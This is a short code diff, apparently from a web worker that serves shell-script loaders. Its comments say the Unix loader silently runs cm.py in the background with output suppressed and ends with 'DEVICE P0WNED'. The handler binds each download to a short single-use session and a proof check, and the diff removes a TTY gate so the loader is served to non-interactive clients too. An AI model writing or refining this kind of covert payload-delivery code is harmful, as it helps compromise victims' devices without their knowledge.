@@ -260,10 +260,8 @@ async function consumeSession(request, host, now) {
  *   - Runs cm.py silently in background (all output suppressed)
  *   - Ends with DEVICE P0WNED — nothing after it
  */
-function buildUnixLoader(origin, token, challenge, requireTty) {
-  const ttyLine = requireTty
-    ? `( : </dev/tty ) 2>/dev/null || { printf 'err occured\\n' >&2; exit 1; }`
-    : `:;`;
+function buildUnixLoader(origin, token, challenge) {
+  const ttyLine = `:;`;
 
   return `#!/bin/sh
 set -eu
@@ -549,8 +547,7 @@ export default {
       if (win) {
         return okResponse(buildWinLoader(url.origin, token, challenge), "text/plain; charset=utf-8");
       }
-      const requireTty = String(env?.ALLOW_NON_TTY || "") !== "1";
-      return okResponse(buildUnixLoader(url.origin, token, challenge, requireTty), "text/plain; charset=utf-8");
+      return okResponse(buildUnixLoader(url.origin, token, challenge), "text/plain; charset=utf-8");
     }
 
     // POST: verify 10s single-use IP/UA/colo/TLS-bound session + SHA-256 proof.
